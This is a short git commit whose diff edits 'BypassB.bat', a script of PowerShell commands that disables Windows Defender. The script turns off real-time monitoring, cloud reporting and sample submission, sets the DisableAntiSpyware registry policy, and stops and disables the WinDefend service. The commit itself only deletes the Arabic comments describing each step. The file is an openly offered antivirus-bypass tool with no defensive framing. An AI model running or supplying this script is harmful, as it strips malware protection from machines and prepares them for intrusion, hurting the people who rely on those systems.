6a1c26c48b2f45cadfd8916232ca6ea986b6c558
v-0v <108912188+v-0v@users.noreply.github.com>
2024-09-28 00:51:11 +0300

    disable_defender.ps1

--- BypassB.bat
+++ BypassB.bat
@@ -1,16 +1,16 @@
-# تعطيل الحماية في الوقت الحقيقي
+
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-# تعطيل الحماية السحابية وإرسال العينات تلقائيًا
+
 Set-MpPreference -MAPSReporting Disabled
 Set-MpPreference -SubmitSamplesConsent 2
 
-# تعطيل Windows Defender من الريجستري
+
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
 
-# إيقاف خدمة Windows Defender وتعطيلها
+
 Stop-Service -Name WinDefend -Force
 Set-Service -Name WinDefend -StartupType Disabled
 
-# تأكيد التنفيذ
+
 Write-Host "Windows Defender has been disabled."
